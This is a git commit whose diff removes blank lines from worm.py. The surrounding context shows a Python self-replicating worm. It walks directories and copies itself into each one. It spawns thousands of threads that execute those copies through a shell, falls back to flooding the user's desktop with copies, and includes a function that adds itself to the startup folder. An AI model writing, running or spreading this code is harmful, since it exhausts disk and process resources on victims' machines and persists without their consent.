61b98d34d0f00fb361d87de63e9f8e67fe74ee6e
A.Cookie.1 <148724829+ACookie10012@users.noreply.github.com>
2024-01-03 20:09:10 -0500

    Update worm.py
    some weirdo added a bunch of random indentations

--- worm.py
+++ worm.py
@@ -7,13 +7,10 @@ import subprocess
 import sys
 import getpass
 
-
 # Ver 3
-
 
 global lock
 lock = False
-
 
 NOTI = 5000
 F_ex = '.py'
@@ -25,20 +22,14 @@ def tags(): #Works
     return tag
 
 
-
-
 def create_1(dst, name): #Prior i did not add .py/.exe and the wrong file (.txt) was being searched for
     shutil.copy(__file__, f"{dst}/{name}{F_ex}")
     T.Thread(target=ShutilExecute, args=(cmd, dst, name, F_ex)).start()
 
 
-
-
 def create_2(dst, name):
     shutil.copy(__file__, f"{dst}/{name}{F_ex}")
     T.Thread(target=ShutilExecute, args=(cmd, dst, name, F_ex)).start()
-
-
 
 
 def create_file3(dst, name): # Diff name, should exc when dir not avaiable. (F)
@@ -47,14 +38,10 @@ def create_file3(dst, name): # Diff name, should exc when dir not avaiable. (F)
         T.Thread(target=ShutilExecute, args=(cmd, '', name, F_ex)).start()
 
 
-
-
 def create_file4(dst, name): # Diff name, should exc when dir not avaiable. (F)
     if dst == 'F':
         shutil.copy(__file__, f"{name}{F_ex}")
         T.Thread(target=ShutilExecute, args=(cmd, '', name, F_ex)).start()
-
-
 
 
 def add_to_startup():
@@ -64,20 +51,10 @@ def add_to_startup():
     shutil.copy(script_path, startup_folder)
 
 
-
-
-
-
-
-
 def file_run(dst, name):
     #Should use any extra time to run another file.
     #LINKED to one, so every stack gets its own extra.
     T.Thread(target=ShutilExecute, args=(cmd, dst, name, F_ex), daemon=False).start()
-
-
-
-
 
 
 def intilize():
@@ -95,16 +72,8 @@ def intilize():
             time.sleep(0.5)
 
 
-
-
-
-
 def search():
     Dir = []
-
-
-
-
     for root, dirs, files in os.walk("./", topdown=False):
         for name in files:
             Dir.append(os.path.join(root, name))
@@ -113,13 +82,7 @@ def search():
     return Dir
 
 
-
-
-
-
 def ShutilExecute(cmd, dst, name, exentension):
-
-
     if lock is False:
         try:
             subprocess.run([f'{cmd}', f"{dst}/{name}{exentension}"], shell=True)
@@ -130,17 +93,9 @@ def ShutilExecute(cmd, dst, name, exentension):
         pass
 
 
-
-
-
-
 def main(Dir):
     intilize()
     CUSTOMTAG = f"FILE{tags()}" #Tag for only num 1, allows threading for second file.
-
-
-
-
     for item in Dir:
         if os.path.isdir(item):
             if os.access(item, os.R_OK):
@@ -150,41 +105,24 @@ def main(Dir):
                         T.Thread(target=create_1, args=(item, CUSTOMTAG), daemon=True).start()
                         T.Thread(target=file_run, args=(item, CUSTOMTAG), daemon=True).start()
                         T.Thread(target=create_2, args=(item, f"FILE{tags()}"), daemon=True).start()
-
-
-
-
                 except:
                     for _ in range(NOTI):
                         T.Thread(target=create_file3, args=("F", f"FILE{tags()}"), daemon=True).start()
                         T.Thread(target=file_run, args=(item, CUSTOMTAG), daemon=True).start()
                         T.Thread(target=create_file4, args=("F", f"FILE{tags()}"), daemon=True).start()
-
-
-
-
             else:
                 print(f'\x1b[6;30;42m' + f'DIR {item} FAILED (CANNOT EDIT)!' + '\x1b[0m')
                 for _ in range(NOTI):
                     try:
                       T.Thread(target=create_1, args=(f"c:/Users/{getpass.getuser()}/OneDrive/Desktop", CUSTOMTAG), daemon=True).start() #If no dir was found it will spam your desktop.
                       T.Thread(target=file_run, args=(f"c:/Users/{getpass.getuser()}/OneDrive/Desktop", CUSTOMTAG), daemon=True).start()          
-
-
-
-
                     except:
                        T.Thread(target=create_file3, args=("F", f"FILE{tags()}"), daemon=True).start()
                        T.Thread(target=create_file4, args=("F", f"FILE{tags()}"), daemon=True).start()
-
-
         else:
             print(f'\x1b[6;30;42m' + f'DIR {item} FAILED (NOT DIR) !' + '\x1b[0m')
             T.Thread(target=create_file3, args=("F", f"FILE{tags()}"), daemon=True).start()
             T.Thread(target=create_file4, args=("F", f"FILE{tags()}"), daemon=True).start()
-
-
-
 
 if __name__ == "__main__":
     main(search())
